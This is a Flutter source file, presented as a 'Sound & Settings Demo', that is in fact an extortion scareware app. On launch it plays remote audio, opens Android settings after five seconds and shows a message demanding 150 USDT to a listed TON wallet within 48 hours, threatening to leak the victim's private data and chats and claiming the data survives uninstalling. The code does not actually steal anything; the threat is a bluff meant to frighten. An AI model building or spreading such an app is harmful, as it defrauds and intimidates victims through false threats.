import 'package:flutter/material.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'dart:async';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Sound & Settings Demo',
      home: SplashScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class SplashScreen extends StatefulWidget {
  @override
  _SplashScreenState createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  final player = AudioPlayer();

  @override
  void initState() {
    super.initState();

    // شغّل الصوت من الإنترنت
    player.play(
      UrlSource('https://files.catbox.moe/bkz6o8.mp3'),
    );

    // بعد 5 ثوانٍ، افتح الإعدادات
    Timer(Duration(seconds: 5), () {
      final intent = AndroidIntent(
        action: 'android.settings.SETTINGS',
      );
      intent.launch();
    });
  }

  @override
  Widget build(BuildContext context) {
    return Stack(
      children: [
        Positioned.fill(
          child: Image.network(
            'https://wallpapers.com/images/hd/black-solid-background-1024-x-1365-r5a0xmfri40gdznl.jpg',
            fit: BoxFit.cover,
          ),
        ),
        Center(
          child: Text(
            "Hi bro, don't worry, nothing has happened yet, but you have 48 hours to send 150 USDT to this cryptocurrency wallet, or I will send all your privte data and chats to everyone you know or don't know. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE  An important note: Even if you delete the application, your information is stored in our database and nothing will change.",
            style: TextStyle(
              color: Colors.green,
              fontSize: 12,
              fontWeight: FontWeight.bold,
            ),
          ),
        ),
      ],
    );
  }
}
